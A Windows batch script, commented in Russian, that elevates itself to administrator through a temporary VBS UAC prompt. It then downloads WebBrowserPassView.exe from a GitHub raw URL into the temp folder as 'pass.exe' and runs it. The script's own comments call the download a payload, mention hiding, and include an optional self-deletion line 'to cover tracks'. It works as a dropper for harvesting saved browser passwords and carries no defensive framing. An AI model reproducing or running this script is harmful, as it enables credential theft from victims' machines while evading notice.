@echo off
:: =======================================================
:: БЛОК 1: АВТО-ПОЛУЧЕНИЕ ПРАВ АДМИНИСТРАТОРА
:: =======================================================
:: Проверяем, есть ли права админа. Если нет - перезапускаем сами себя с запросом прав.
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Запрос прав администратора...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: =======================================================
:: БЛОК 2: ПОЛЕЗНАЯ НАГРУЗКА (То, что делал PowerShell)
:: =======================================================

:: 1. Скрываемся (аналог Win+D - просто очищаем экран, батник сложно свернуть полностью без сторонних утилит)
cls
echo Загрузка...

:: 2. Настройки (Твоя ссылка)
set "URL=https://raw.githubusercontent.com/tuchaC/po/main/WebBrowserPassView.exe"
set "SAVE_PATH=%TEMP%\pass.exe"

:: 3. Скачивание файла (Используем PowerShell внутри батника)
:: Мы используем -Force, чтобы перезаписать файл, если он уже есть
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%SAVE_PATH%' -Force"

:: 4. Запуск файла
start "" "%SAVE_PATH%"

:: 5. Самоудаление батника (Опционально: чтобы замести следы)
:: del "%~f0" & exit